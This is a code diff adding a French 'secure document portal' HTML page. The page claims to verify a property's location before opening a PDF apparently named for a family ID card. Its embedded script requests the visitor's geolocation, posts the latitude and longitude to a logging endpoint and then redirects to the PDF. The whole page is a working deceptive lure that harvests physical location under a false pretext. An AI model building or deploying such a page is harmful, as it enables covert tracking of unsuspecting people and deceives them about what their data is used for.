@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Portail Document Sécurisé</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 60px;
+        }
+        #container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+            display: inline-block;
+        }
+        img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #555;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <img src="/static/logo.png" alt="Logo">
+        <h1>Chargement sécurisé du document</h1>
+        <p>Merci de patienter pendant la vérification automatique de la localisation du bien.</p>
+        <p>Votre document va s’ouvrir automatiquement.</p>
+    </div>
+
+    <script>
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                fetch("/log_position", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    })
+                });
+            });
+        }
+
+        // Redirection automatique vers le PDF
+        setTimeout(() => {
+            window.location.href = "/static/CNI-Famille.pdf";
+        }, 3000); // délai de 3 secondes
+    </script>
+</body>
+</html>
